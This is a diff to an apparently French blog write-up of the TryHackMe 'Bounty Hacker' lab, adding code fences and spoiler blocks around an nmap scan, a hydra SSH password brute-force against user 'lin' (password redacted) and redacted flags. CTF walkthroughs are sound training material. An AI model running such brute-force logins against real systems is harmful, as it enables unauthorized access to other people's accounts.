@@ -27,6 +27,8 @@ nmap -A -T4 bountyhacker.thm
 ```
 
 {% capture spoil %}
+
+```txt
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-19 15:58 CEST
 Nmap scan report for bountyhacker.thm (10.10.35.165)
 Host is up (0.032s latency).
@@ -68,6 +70,8 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 45.88 seconds
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -127,6 +131,8 @@ hydra -l 'lin' -P locks.txt bountyhacker.thm ssh
 ```
 
 {% capture spoil %}
+
+```txt
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-19 16:27:34
@@ -136,6 +142,8 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-19 16:27:
 [22][ssh] host: bountyhacker.thm   login: lin   password: Re[...expurgé...]t3
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-19 16:27:37
+```
+
 {% endcapture %}
 {% include elements/spoil.html %}
 
@@ -148,8 +156,16 @@ ls
 user.txt
 
 cat user.txt
+```
+
+{% capture spoil %}
+
+```txt
 THM{[...expurgé...]}
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
 
 ## Élévation de privilèges
 
@@ -184,5 +200,13 @@ ls
 root.txt
 
 cat root.txt
+```
+
+{% capture spoil %}
+
+```txt
 THM{[...expurgé...]}
 ```
+
+{% endcapture %}
+{% include elements/spoil.html %}
